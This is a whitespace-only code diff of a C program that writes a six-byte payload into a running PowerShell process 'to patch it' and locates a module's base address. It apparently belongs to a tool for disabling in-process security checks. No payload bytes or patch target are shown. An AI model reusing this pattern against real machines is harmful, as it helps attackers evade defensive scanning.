@@ -47,7 +47,7 @@ int main(int argc, char *argv[])
 	}
 	
 	// write the payload to the powershell process to patch it
-    if(!WriteProcessMemory(hRemoteProcess, addr, (PVOID)payload, (SIZE_T)6, (SIZE_T *)NULL))
+    	if(!WriteProcessMemory(hRemoteProcess, addr, (PVOID)payload, (SIZE_T)6, (SIZE_T *)NULL))
 	{
 		printf("Failed to patch!\n");
 		printf("Error: %d\n", GetLastError());
@@ -61,30 +61,30 @@ char* GetModuleBase(const wchar_t* ModuleName, DWORD procID)
 {
     MODULEENTRY32 ModuleEntry = { 0 };
 	
-	// take a snapshot of the process memory
+    // take a snapshot of the process memory
     HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procID);
 
     if (!SnapShot)
-	{
-		return NULL;
-	}
+    {
+	    return NULL;
+    }
 	
     ModuleEntry.dwSize = sizeof(ModuleEntry);
 
-	// get the first module in memory
+    // get the first module in memory
     if (!Module32First(SnapShot, &ModuleEntry))
-	{
-		return NULL;
-	}
+    {
+	    return NULL;
+    }
 	
-	// loop through the modules until we find the one we want
+    // loop through the modules until we find the one we want
     do
     {
-		if (strcmp(ModuleEntry.szModule, ModuleName) == 0)
-        {
-            CloseHandle(SnapShot);
-            return (char*)ModuleEntry.modBaseAddr;
-        }
+	    if (strcmp(ModuleEntry.szModule, ModuleName) == 0)
+            {
+                CloseHandle(SnapShot);
+                return (char*)ModuleEntry.modBaseAddr;
+            }
     } while (Module32Next(SnapShot, &ModuleEntry));
 
     CloseHandle(SnapShot);
